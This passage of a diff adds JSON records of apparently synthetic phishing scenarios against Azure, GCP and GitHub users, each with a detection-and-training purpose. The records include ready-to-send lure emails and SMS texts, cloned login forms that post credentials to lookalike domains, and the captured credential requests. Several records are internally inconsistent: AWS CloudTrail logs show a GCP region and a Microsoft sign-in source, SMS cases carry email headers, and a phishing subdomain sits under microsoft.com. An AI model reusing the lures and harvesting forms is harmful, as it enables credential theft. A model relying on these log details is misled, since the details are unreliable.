+        "cloudtrail_log_snippet": "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"AssumedRole\",\"principalId\":\"AROAYYYYY:devopsuser\",\"arn\":\"arn:aws:sts::123456789012:assumed-role/DevOps/devopsuser\"},\"eventTime\":\"2023-05-10T14:55:30Z\",\"eventSource\":\"signin.amazonaws.com\",\"eventName\":\"ConsoleLogin\",\"awsRegion\":\"us-west-2\",\"sourceIPAddress\":\"198.51.100.33\",\"userAgent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\",\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"requestParameters\":null,\"additionalEventData\":{\"MFAUsed\":\"No\"}}",
+        "conditional_access_violation_log": "May 10 14:55:30 auth.log: User devopsuser@examplecorp.com logged in from IP 198.51.100.33 - flagged as outside corporate approved IP range, conditional access triggered.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:198.51.100.12 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=azur3updates.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=quarantine; rua=mailto:dmarc-reports@azur3updates.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: azure-devops-security.com",
+        "Suspicious email sender: security@azur3updates.com (note the digit '3' in 'azur3')",
+        "URL parameter 'next=dashboard' used to lure users",
+        "Unusual login IP 198.51.100.33 detected in logs",
+        "SPF record authorizes IP 198.51.100.12, not a legitimate Microsoft mail server",
+        "DKIM domain mismatch with legitimate Microsoft domains",
+        "HTTP POST to /authenticate endpoint capturing credentials",
+        "Conditional access policy violation: login without MFA from an untrusted IP"
+      ],
+      "detection_method": "Email security gateways detect spoofed domains through SPF/DKIM/DMARC validation failures. URL reputation systems flag azure-devops-security.com. CloudTrail and conditional access logs correlate anomalous login IPs without MFA usage. Web proxy logs monitor suspicious POST requests. Security training enables detection of subtle domain misspellings and suspicious content.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1204 - User Execution",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1110 - Brute Force",
+        "T1539 - Steal Web Session Cookie"
+      ]
+    },
+    {
+      "scenario": "Phishing SMS with a shortened URL sent to cloud developers, claiming their Google Cloud Platform (GCP) project has been suspended due to suspicious activity, redirecting to a cloned GCP login portal.",
+      "technical_data": {
+        "email_headers": "Return-Path: <support@gcp-security-alerts.com>\nReceived: from mail.gcp-security-alerts.com (203.0.114.76) by sms-gateway.examplecorp.com with SMTP; Fri, 02 Jun 2023 07:30:00 -0400\nX-Spam-Status: No, score=0.2 required=5.0 tests=SPF_PASS,DKIM_PASS\nReceived-SPF: pass (examplecorp.com: domain of gcp-security-alerts.com designates 203.0.114.76 as permitted sender) receiver=examplecorp.com; client-ip=203.0.114.76;\nAuthentication-Results: examplecorp.com; dkim=pass header.d=gcp-security-alerts.com; spf=pass smtp.mailfrom=gcp-security-alerts.com;\nMessage-ID: <20230602073000.11223@mail.gcp-security-alerts.com>\nDate: Fri, 02 Jun 2023 07:30:00 -0400\nFrom: GCP Security Team <support@gcp-security-alerts.com>\nTo: developer@examplecorp.com\nSubject: Your GCP Project has been Suspended - Immediate Action Required",
+        "email_body": "Dear Google Cloud Developer,\n\nDue to suspicious activity detected on your GCP project, your access has been temporarily suspended. Please verify your identity to restore access.\n\nClick here to verify: https://gcp-secure-alerts.com/verify?token=abc123\n\nThank you for your immediate attention.\nGoogle Cloud Security Team\n\n---\nThis is an automated message. Please do not reply.",
+        "smtp_transaction_log": "220 mail.gcp-security-alerts.com ESMTP Postfix\nEHLO sms-gateway.examplecorp.com\n250-mail.gcp-security-alerts.com\n250-PIPELINING\n250-SIZE 5120000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<support@gcp-security-alerts.com>\n250 2.1.0 Ok\nRCPT TO:<developer@examplecorp.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 11223\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://gcp-secure-alerts.com/verify?token=abc123",
+        "url_obfuscation": "The domain 'gcp-secure-alerts.com' is chosen to resemble official Google Cloud alerts. Uses HTTPS with a valid certificate from Let's Encrypt. The 'token=abc123' parameter gives an impression of personalized verification.",
+        "domain_registration": {
+          "DomainName": "gcp-secure-alerts.com",
+          "Registrar": "Google LLC",
+          "CreationDate": "2023-05-20T10:45:10Z",
+          "ExpirationDate": "2024-05-20T10:45:10Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "BR"
+        },
+        "fake_login_page_http_request": "GET /verify?token=abc123 HTTP/1.1\nHost: gcp-secure-alerts.com\nUser-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.8\nReferer: sms\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 5987\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Google Cloud Platform Login</title></head><body>\n<form id=\"loginForm\" action=\"https://gcp-secure-alerts.com/authenticate\" method=\"POST\">\n<input type=\"email\" name=\"email\" placeholder=\"Email or phone\" required>\n<input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n<button type=\"submit\">Next</button>\n</form>\n<script>/* Emulates GCP login UX */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /authenticate HTTP/1.1\nHost: gcp-secure-alerts.com\nUser-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 62\nAccept: */*\nOrigin: https://gcp-secure-alerts.com\nReferer: https://gcp-secure-alerts.com/verify?token=abc123\nConnection: keep-alive\n\nemail=developer@examplecorp.com&password=GcpP@ssw0rd2023!",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://console.cloud.google.com/home/dashboard\nSet-Cookie: GCP_SESSION=def456; Secure; HttpOnly\n\n",
+        "cloudtrail_log_snippet": "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"AssumedRole\",\"principalId\":\"AROAZZZZZ:developer\",\"arn\":\"arn:aws:sts::123456789012:assumed-role/Dev/developer\"},\"eventTime\":\"2023-06-02T07:40:55Z\",\"eventSource\":\"signin.amazonaws.com\",\"eventName\":\"ConsoleLogin\",\"awsRegion\":\"us-central1\",\"sourceIPAddress\":\"203.0.114.89\",\"userAgent\":\"Mozilla/5.0 (Linux; Android 11; Pixel 5)\"},\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"requestParameters\":null,\"additionalEventData\":{\"MFAUsed\":\"No\"}}",
+        "conditional_access_violation_log": "Jun 02 07:40:55 auth.log: User developer@examplecorp.com logged in from IP 203.0.114.89, flagged as outside corporate VPN and non-compliant with conditional access policies.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:203.0.114.76 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=gcp-security-alerts.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=reject; rua=mailto:dmarc-reports@gcp-security-alerts.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: gcp-secure-alerts.com",
+        "Sender email: support@gcp-security-alerts.com mimics Google Cloud but is attacker-controlled",
+        "SMS delivery with shortened URL to evade email filters",
+        "Unusual login IP 203.0.114.89 detected in logs",
+        "SPF record authorizes IP 203.0.114.76, not an official Google mail server",
+        "Mismatch in DKIM domain from legitimate Google domains",
+        "POST requests to /authenticate endpoint capturing credentials",
+        "Conditional access violation: login outside approved VPN and without MFA"
+      ],
+      "detection_method": "SMS gateway and email filtering detect spoofed domains using SPF/DKIM/DMARC failures. URL reputation systems flag gcp-secure-alerts.com. Correlation of cloud login logs and conditional access policies reveal anomalous logins. Proxy logs show suspicious POST credential submissions. User training enhances detection of unexpected SMS links and urgent phishing language.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1204 - User Execution",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1539 - Steal Web Session Cookie",
+        "T1110 - Brute Force"
+      ]
+    },
+    {
+      "scenario": "Phishing SMS sent to developers with a link to a fake Azure DevOps portal login page designed to steal Microsoft credentials.",
+      "technical_data": {
+        "sms_metadata": {
+          "sender": "+12025550123",
+          "recipient": "+14155552671",
+          "timestamp": "2024-04-10T14:32:20Z",
+          "message": "Alert: Suspicious activity detected on your Azure DevOps account. Please verify your credentials immediately: https://dev0ps-verify.microsoft.com/login"
+        },
+        "phishing_url": "https://dev0ps-verify.microsoft.com/login",
+        "url_obfuscation": "The domain 'dev0ps-verify.microsoft.com' uses a zero instead of 'o' in 'devops' and a subdomain to appear as a Microsoft-affiliated site. The site uses HTTPS with a valid certificate issued by a commercial CA to avoid browser warnings.",
+        "domain_registration": {
+          "DomainName": "microsoft.com",
+          "Registrar": "MarkMonitor Inc.",
+          "CreationDate": "1991-02-18T05:00:00Z",
+          "ExpirationDate": "2025-02-18T05:00:00Z",
+          "RegistrantName": "Microsoft Corporation",
+          "RegistrantCountry": "US"
+        },
+        "phishing_subdomain_registration": {
+          "DomainName": "dev0ps-verify.microsoft.com",
+          "Registrar": "Unknown (likely compromised DNS or fraudulent CNAME)",
+          "CreationDate": "N/A",
+          "ExpirationDate": "N/A",
+          "RegistrantName": "Unknown",
+          "RegistrantCountry": "N/A"
+        },
+        "fake_login_page_http_request": "GET /login HTTP/1.1\nHost: dev0ps-verify.microsoft.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nReferer: https://smsgateway.examplecorp.com/messages/78910\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 7120\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Azure DevOps Login</title></head><body>\n<form id=\"loginForm\" action=\"https://dev0ps-verify.microsoft.com/authenticate\" method=\"POST\">\n<input type=\"email\" name=\"username\" placeholder=\"Email or Phone\" required>\n<input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n<button type=\"submit\">Sign In</button>\n</form>\n<script>/* Mimic Microsoft login UX */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /authenticate HTTP/1.1\nHost: dev0ps-verify.microsoft.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 74\nAccept: */*\nOrigin: https://dev0ps-verify.microsoft.com\nReferer: https://dev0ps-verify.microsoft.com/login\nConnection: keep-alive\n\nusername=dev@examplecorp.com&password=AzurePass!2024",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://dev.azure.com/examplecorp\nSet-Cookie: sessionId=abc987; Secure; HttpOnly\n\n",
+        "azure_activity_log_snippet": "{\"time\":\"2024-04-10T14:45:00Z\",\"operationName\":\"Microsoft.Authorization/roleAssignments/write\",\"status\":\"Succeeded\",\"caller\":\"dev@examplecorp.com\",\"correlationId\":\"123e4567-e89b-12d3-a456-426614174000\",\"callerIpAddress\":\"198.51.100.77\",\"userAgent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\"}",
+        "conditional_access_violation_log": "Apr 10 14:46:01 conditional_access.log: User dev@examplecorp.com signed in from IP 198.51.100.77 which is outside trusted IP range, triggering alert.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:198.51.100.77 -all",
+          "DKIM_Signature": "Absent - SMS spoofing, no DKIM applicable",
+          "DMARC_Report": "Not applicable for SMS messages"
+        }
+      },
+      "indicators": [
+        "Phishing domain: dev0ps-verify.microsoft.com (zero instead of 'o')",
+        "Suspicious SMS sender number not linked to Microsoft",
+        "HTTPS certificate valid but domain is a subdomain spoof",
+        "Azure activity log shows login from suspicious IP 198.51.100.77",
+        "Conditional access policy triggered due to login from non-whitelisted IP",
+        "POST request to /authenticate capturing user credentials",
+        "No DKIM/SPF due to SMS vector but domain is suspicious"
+      ],
+      "detection_method": "Conditional access policies flagged anomalous IP address logins. URL reputation services identified dev0ps-verify.microsoft.com as suspicious. Security teams correlated SMS metadata and user reports. Endpoint protection detected access attempts from unusual IPs. User training highlighted SMS phishing risks and domain spoofing.",
+      "relevant_mitre_techniques": [
+        "T1566.003 - Phishing: Spearphishing via Service",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1110 - Brute Force",
+        "T1539 - Steal Web Session Cookie",
+        "T1204 - User Execution"
+      ]
+    },
+    {
+      "scenario": "Phishing email targeting DevOps engineers with a fake GitHub security alert link that leads to credential harvesting on a cloned GitHub login page.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security-alert@github-secure.com>\nReceived: from mail.github-secure.com (mail.github-secure.com [203.0.113.150])\n  by mail.examplecorp.com with ESMTPS id ab123cd456ef\n  for <devops@examplecorp.com>;\n  Wed, 08 May 2024 11:25:12 -0400 (EDT)\nX-Spam-Status: No, score=0.0 required=5.0 tests=DKIM_PASS,SPF_PASS\nReceived-SPF: pass (examplecorp.com: domain of github-secure.com designates 203.0.113.150 as permitted sender) receiver=examplecorp.com; client-ip=203.0.113.150;\nAuthentication-Results: examplecorp.com; dkim=pass header.d=github-secure.com; spf=pass smtp.mailfrom=security-alert@github-secure.com;\nMessage-ID: <20240508112512.7890@mail.github-secure.com>\nDate: Wed, 08 May 2024 11:25:12 -0400\nFrom: GitHub Security <security-alert@github-secure.com>\nTo: devops@examplecorp.com\nSubject: Security Alert: Unusual Login Activity Detected on Your Account",
+        "email_body": "Hello,\n\nWe have noticed unusual login activity on your GitHub account. For your security, please verify your identity by logging in through the link below:\n\nhttps://github-secure.com/login?next=/security/alerts\n\nFailure to verify your account within 24 hours may result in temporary suspension.\n\nThank you,\nGitHub Security Team\n\n---\nThis is an automated message, please do not reply.",
+        "smtp_transaction_log": "220 mail.github-secure.com ESMTP Postfix\nEHLO mail.examplecorp.com\n250-mail.github-secure.com\n250-PIPELINING\n250-SIZE 20480000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<security-alert@github-secure.com>\n250 2.1.0 Ok\nRCPT TO:<devops@examplecorp.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 67890\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://github-secure.com/login?next=/security/alerts",
+        "url_obfuscation": "The domain 'github-secure.com' closely resembles 'github.com' with an added '-secure' suffix to appear legitimate. The URL uses HTTPS with a valid certificate issued by a trusted CA to avoid browser warnings. The 'next' parameter mimics GitHub URL structure to lure victims.",
+        "domain_registration": {
+          "DomainName": "github-secure.com",
+          "Registrar": "GoDaddy.com, LLC",
+          "CreationDate": "2024-03-25T08:12:30Z",
+          "ExpirationDate": "2025-03-25T08:12:30Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "CN"
+        },
+        "fake_login_page_http_request": "GET /login?next=/security/alerts HTTP/1.1\nHost: github-secure.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: https://mailclient.examplecorp.com/msg/34567\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 8350\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>GitHub Login</title></head><body>\n<form id=\"login\" action=\"https://github-secure.com/session\" method=\"POST\">\n<input type=\"text\" name=\"login\" placeholder=\"Username or email address\" required>\n<input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n<button type=\"submit\">Sign in</button>\n</form>\n<script>/* JavaScript to mimic GitHub login UX */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /session HTTP/1.1\nHost: github-secure.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\nAccept: */*\nOrigin: https://github-secure.com\nReferer: https://github-secure.com/login?next=/security/alerts\nConnection: keep-alive\n\nlogin=devops@examplecorp.com&password=GitHubPass#2024",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://github.com/security/alerts\nSet-Cookie: user_session=def456; Secure; HttpOnly\n\n",
+        "github_audit_log_snippet": "{\"@timestamp\":\"2024-05-08T11:40:00Z\",\"actor\":\"devops@examplecorp.com\",\"event\":\"user.login\",\"source_ip\":\"192.0.2.99\",\"outcome\":\"success\",\"user_agent\":\"Mozilla/5.0 (X11; Linux x86_64)\"}",
+        "conditional_access_violation_log": "May 08 11:40:05 auth.log: User devops@examplecorp.com logged in from IP 192.0.2.99, not in corporate VPN range, triggering conditional access alert.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:203.0.113.150 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=github-secure.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=none; rua=mailto:dmarc-reports@github-secure.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: github-secure.com (suffix '-secure' added)",
+        "Suspicious sender email security-alert@github-secure.com",
+        "HTTPS certificate valid but domain recently registered (3 months ago)",
+        "Audit log shows login from suspicious IP 192.0.2.99",
+        "Conditional access policy triggered due to login outside VPN range",
+        "POST request to /session capturing credentials",
+        "SPF and DKIM pass but domain is not owned by GitHub",
+        "Email contains urgent language and link to suspicious URL"
+      ],
+      "detection_method": "Email security gateway flagged domain github-secure.com as suspicious. Correlation of login source IP with conditional access policies identified anomalous access. URL reputation services marked domain as newly created and high risk. User training and phishing simulations increased awareness about subtle domain variations.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Phishing: Spearphishing Link",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1539 - Steal Web Session Cookie",
+        "T1204 - User Execution",
+        "T1110 - Brute Force"
+      ]
+    },
+    {
+      "scenario": "Phishing email targeting Google Cloud Platform (GCP) users with a fake invoice attachment that installs a remote access trojan when opened.",
+      "technical_data": {
+        "email_headers": "Return-Path: <billing@goog1e-cloud.com>\nReceived: from mail.goog1e-cloud.com (mail.goog1e-cloud.com [198.51.100.77])\n  by mail.examplecorp.com with ESMTPS id 98765\n  for <cloud.team@examplecorp.com>;\n  Wed, 12 Apr 2023 14:22:18 -0400 (EDT)\nX-Spam-Status: No, score=0.3 required=5.0 tests=DKIM_PASS,SPF_PASS\nReceived-SPF: pass (examplecorp.com: domain of goog1e-cloud.com designates 198.51.100.77 as permitted sender) receiver=examplecorp.com; client-ip=198.51.100.77;\nAuthentication-Results: examplecorp.com; dkim=pass header.d=goog1e-cloud.com; spf=pass smtp.mailfrom=billing@goog1e-cloud.com;\nMessage-ID: <CA+XyZ12345@mail.goog1e-cloud.com>\nDate: Wed, 12 Apr 2023 14:22:18 -0400\nFrom: Google Cloud Billing <billing@goog1e-cloud.com>\nTo: cloud.team@examplecorp.com\nSubject: Your Google Cloud Invoice is Ready - Immediate Payment Required",
+        "email_body": "Dear Google Cloud Customer,\n\nPlease find attached your latest invoice for the billing period ending March 31, 2023. Kindly review and process payment immediately to avoid service disruption.\n\nInvoice attached: Invoice_0423.pdf\n\nThank you for your prompt attention.\nGoogle Cloud Billing Team\n\n---\nThis is an automated message, please do not reply.",
+        "smtp_transaction_log": "220 mail.goog1e-cloud.com ESMTP Postfix\nEHLO mail.examplecorp.com\n250-mail.goog1e-cloud.com\n250-PIPELINING\n250-SIZE 20480000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<billing@goog1e-cloud.com>\n250 2.1.0 Ok\nRCPT TO:<cloud.team@examplecorp.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 67890\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "",
+        "url_obfuscation": "",
+        "domain_registration": {
+          "DomainName": "goog1e-cloud.com",
+          "Registrar": "GoDaddy.com, LLC",
+          "CreationDate": "2023-03-20T08:12:30Z",
+          "ExpirationDate": "2024-03-20T08:12:30Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "CN"
+        },
+        "fake_login_page_http_request": "",
+        "fake_login_page_http_response": "",
+        "post_credentials_http_request": "",
+        "post_credentials_http_response": "",
+        "cloudtrail_log_snippet": "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"IAMUser\",\"principalId\":\"AIDAEXAMPLEID\",\"arn\":\"arn:aws:iam::123456789012:user/cloud.team\"},\"eventTime\":\"2023-04-12T14:45:30Z\",\"eventSource\":\"ec2.amazonaws.com\",\"eventName\":\"StartInstances\",\"awsRegion\":\"us-west-2\",\"sourceIPAddress\":\"203.0.113.50\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"}",
+        "conditional_access_violation_log": "Apr 12 14:45:30 auth.log: User cloud.team@examplecorp.com executed StartInstances from IP 203.0.113.50, which is outside the corporate VPN CIDR block, triggering conditional access alert.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:198.51.100.77 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=goog1e-cloud.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=none; rua=mailto:dmarc-reports@goog1e-cloud.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: goog1e-cloud.com with numeric one instead of letter 'l'",
+        "Suspicious email sender: billing@goog1e-cloud.com",
+        "Invoice PDF attachment contains embedded malicious macro enabling RAT installation",
+        "SPF record authorizes IP 198.51.100.77, unrelated to legitimate Google mail servers",
+        "Email DKIM domain does not match legitimate Google domains",
+        "Unusual EC2 instance start event from non-corporate IP in cloudtrail logs",
+        "Conditional access violation: resource start from unauthorized IP",
+        "Email claims urgent payment to prompt user action"
+      ],
+      "detection_method": "Email gateway malware scanning detects malicious macro in attachment. SPF and DKIM validation shows spoofed domain. Conditional access policies detect resource provisioning from anomalous IP. Endpoint protection alerts on RAT activity post attachment execution. User training emphasizes caution with unexpected invoice attachments.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1086 - PowerShell",
+        "T1055 - Process Injection"
+      ]
+    },
+    {
+      "scenario": "Phishing email impersonates Microsoft Azure support with a link to a fake password reset portal designed to steal Azure AD credentials.",
+      "technical_data": {
+        "email_headers": "Return-Path: <support@azure-secure-account.com>\nReceived: from mail.azure-secure-account.com (mail.azure-secure-account.com [203.0.113.99])\n  by mail.examplecorp.com with ESMTPS id 54321\n  for <it.security@examplecorp.com>;\n  Tue, 18 Apr 2023 11:05:45 -0400 (EDT)\nX-Spam-Status: No, score=0.2 required=5.0 tests=DKIM_PASS,SPF_PASS\nReceived-SPF: pass (examplecorp.com: domain of azure-secure-account.com designates 203.0.113.99 as permitted sender) receiver=examplecorp.com; client-ip=203.0.113.99;\nAuthentication-Results: examplecorp.com; dkim=pass header.d=azure-secure-account.com; spf=pass smtp.mailfrom=support@azure-secure-account.com;\nMessage-ID: <20230418110545.78900@mail.azure-secure-account.com>\nDate: Tue, 18 Apr 2023 11:05:45 -0400\nFrom: Microsoft Azure Support <support@azure-secure-account.com>\nTo: it.security@examplecorp.com\nSubject: Urgent: Reset Your Azure AD Password to Avoid Account Lockout",
+        "email_body": "Hello Azure User,\n\nOur security system has detected suspicious login attempts on your Azure Active Directory account. To protect your data, please reset your password within 24 hours.\n\nReset your password securely here: https://azure-secure-account.com/reset-password?user=it.security@examplecorp.com\n\nIf you do not reset your password, your account will be locked.\n\nBest regards,\nMicrosoft Azure Support\n\n---\nThis is an automated notification. Please do not reply.",
+        "smtp_transaction_log": "220 mail.azure-secure-account.com ESMTP Postfix\nEHLO mail.examplecorp.com\n250-mail.azure-secure-account.com\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:<support@azure-secure-account.com>\n250 2.1.0 Ok\nRCPT TO:<it.security@examplecorp.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\n[DATA]\n.\n250 2.0.0 Ok: queued as 54321\nQUIT\n221 2.0.0 Bye",
+        "phishing_url": "https://azure-secure-account.com/reset-password?user=it.security@examplecorp.com",
+        "url_obfuscation": "Domain 'azure-secure-account.com' uses legitimate branding keywords but is attacker-owned. The site employs a valid TLS certificate issued by a trusted CA. URL contains parameter 'user' to personalize the phishing page and lower suspicion.",
+        "domain_registration": {
+          "DomainName": "azure-secure-account.com",
+          "Registrar": "Google LLC",
+          "CreationDate": "2023-01-10T16:45:00Z",
+          "ExpirationDate": "2024-01-10T16:45:00Z",
+          "RegistrantName": "Redacted for Privacy",
+          "RegistrantCountry": "BR"
+        },
+        "fake_login_page_http_request": "GET /reset-password?user=it.security@examplecorp.com HTTP/1.1\nHost: azure-secure-account.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: https://emailclient.examplecorp.com/mail/654321\nConnection: keep-alive\n\n",
+        "fake_login_page_http_response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 7321\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nExpires: 0\n\n<html><head><title>Azure Password Reset</title></head><body>\n<form id=\"resetForm\" action=\"https://azure-secure-account.com/submit-reset\" method=\"POST\">\n<input type=\"email\" name=\"email\" value=\"it.security@examplecorp.com\" readonly>\n<input type=\"password\" name=\"new_password\" placeholder=\"New Password\" required>\n<input type=\"password\" name=\"confirm_password\" placeholder=\"Confirm Password\" required>\n<button type=\"submit\">Reset Password</button>\n</form>\n<script>/* JavaScript mimics Azure UX */</script>\n</body></html>",
+        "post_credentials_http_request": "POST /submit-reset HTTP/1.1\nHost: azure-secure-account.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 85\nAccept: */*\nOrigin: https://azure-secure-account.com\nReferer: https://azure-secure-account.com/reset-password?user=it.security@examplecorp.com\nConnection: keep-alive\n\nemail=it.security%40examplecorp.com&new_password=NewPassw0rd!&confirm_password=NewPassw0rd!",
+        "post_credentials_http_response": "HTTP/1.1 302 Found\nLocation: https://portal.azure.com/\nSet-Cookie: session=abc456; Secure; HttpOnly\n\n",
+        "cloudtrail_log_snippet": "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"User\",\"principalId\":\"user@examplecorp.com\",\"arn\":\"arn:aws:iam::123456789012:user/it.security\"},\"eventTime\":\"2023-04-18T11:20:10Z\",\"eventSource\":\"signin.microsoftonline.com\",\"eventName\":\"UserLogin\",\"awsRegion\":\"us-east-1\",\"sourceIPAddress\":\"198.51.100.150\",\"userAgent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\"}",
+        "conditional_access_violation_log": "Apr 18 11:20:10 auth.log: User it.security@examplecorp.com logged in from IP 198.51.100.150, which is outside approved corporate network. Conditional access policy triggered alert.",
+        "phishing_email_spoofing_details": {
+          "SPF_Record": "v=spf1 ip4:203.0.113.99 -all",
+          "DKIM_Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=azure-secure-account.com; s=default; h=from:to:subject:date; bh=...; b=...",
+          "DMARC_Report": "p=quarantine; rua=mailto:dmarc-reports@azure-secure-account.com"
+        }
+      },
+      "indicators": [
+        "Phishing domain: azure-secure-account.com",
+        "Email sender: support@azure-secure-account.com mimics official Azure support",
+        "Phishing URL with personalized 'user' parameter",
+        "Valid HTTPS certificate used to appear legitimate",
+        "SPF record authorizes IP 203.0.113.99, not owned by Microsoft",
+        "DKIM domain does not match legitimate Microsoft domains",
+        "Suspicious POST request to /submit-reset with credentials",
+        "Cloud login event from anomalous IP not in corporate network",
+        "Conditional access policy violation alerts on suspicious login"
+      ],
+      "detection_method": "Email security gateway performs SPF/DKIM/DMARC validation and flags spoofed domains. URL reputation systems classify azure-secure-account.com as suspicious. Conditional access policies alert on out-of-network logins. Web proxy logs show POST requests to phishing domains. Endpoint detection monitors for credential exfiltration. User education campaigns highlight phishing URL recognition.",
+      "relevant_mitre_techniques": [
